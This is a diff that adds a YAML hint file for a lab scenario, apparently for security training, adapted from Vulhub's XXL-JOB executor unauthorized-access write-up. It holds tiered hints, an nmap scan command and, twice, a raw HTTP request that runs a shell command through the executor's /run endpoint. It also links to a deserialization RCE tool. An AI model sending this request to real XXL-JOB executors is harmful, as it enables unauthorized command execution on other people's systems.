@@ -1,0 +1,124 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: xxl-job/unacc
+hint_levels:
+  low:
+  - Inspect the xxl-job service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 8080,9999. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 8080,9999 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): admin: 8080/tcp → container 8080/tcp; executor: 9999/tcp → container
+    9999/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:8080`, `http://{{NODE_IP}}:9999`.'
+  high:
+  - 'Vulnerability: XXL-JOB Executor Unauthorized Access.'
+  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
+    substitutions.
+  - |-
+    Vulnerability Reproduction
+
+    Send the following data packet to the client (executor) to execute commands:
+
+    ```
+    POST /run HTTP/1.1
+    Host: {{NODE_IP}}:9999
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Accept-Language: en
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+    Connection: close
+    Content-Type: application/json
+
+    {
+      "jobId": 1,
+      "executorHandler": "demoJobHandler",
+      "executorParams": "demoJobHandler",
+      "executorBlockStrategy": "COVER_EARLY",
+      "executorTimeout": 0,
+      "logId": 1,
+      "logDateTime": 1586629003729,
+      "glueType": "GLUE_SHELL",
+      "glueSource": "touch /tmp/success",
+      "glueUpdatetime": 1586699003758,
+      "broadcastIndex": 0,
+      "broadcastTotal": 0
+    }
+    ```
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/xxl-job/unacc/1.png
+
+    The command `touch /tmp/success` has been successfully executed:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/xxl-job/unacc/2.png
+
+    Additionally, for XXL-JOB versions below 2.2.0 that don't have a RESTful API, we can execute commands through Hessian deserialization: https://github.com/OneSourceCat/XxlJob-Hessian-RCE.
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/xxl-job/unacc/README.md'
+  - |-
+    Additional public references:
+    - https://mp.weixin.qq.com/s/jzXIVrEl0vbjZxI4xlUm-g
+    - https://landgrey.me/blog/18/
+    - https://github.com/OneSourceCat/XxlJob-Hessian-RCE
+access_instructions:
+  title: XXL-JOB Executor Unauthorized Access
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 8080,9999. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 8080,9999 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): admin: 8080/tcp → container 8080/tcp; executor: 9999/tcp → container 9999/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:8080`, `http://{{NODE_IP}}:9999`.
+  - title: Vulnerability Reproduction
+    instructions: |-
+      Send the following data packet to the client (executor) to execute commands:
+
+      ```
+      POST /run HTTP/1.1
+      Host: {{NODE_IP}}:9999
+      Accept-Encoding: gzip, deflate
+      Accept: */*
+      Accept-Language: en
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+      Connection: close
+      Content-Type: application/json
+
+      {
+        "jobId": 1,
+        "executorHandler": "demoJobHandler",
+        "executorParams": "demoJobHandler",
+        "executorBlockStrategy": "COVER_EARLY",
+        "executorTimeout": 0,
+        "logId": 1,
+        "logDateTime": 1586629003729,
+        "glueType": "GLUE_SHELL",
+        "glueSource": "touch /tmp/success",
+        "glueUpdatetime": 1586699003758,
+        "broadcastIndex": 0,
+        "broadcastTotal": 0
+      }
+      ```
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/xxl-job/unacc/1.png
+
+      The command `touch /tmp/success` has been successfully executed:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/xxl-job/unacc/2.png
+
+      Additionally, for XXL-JOB versions below 2.2.0 that don't have a RESTful API, we can execute commands through Hessian deserialization: https://github.com/OneSourceCat/XxlJob-Hessian-RCE.
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/xxl-job/unacc/README.md
+  readme_sha256: 42d428c3cd8595119acc8b018a7eb878c40b8df9c0bb4a71a476b536b8393d53
+  compose_sha256: b6ed1aad5873b944a65e349f9bdee93ae34b551eea778f5031022c0995ae727a
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
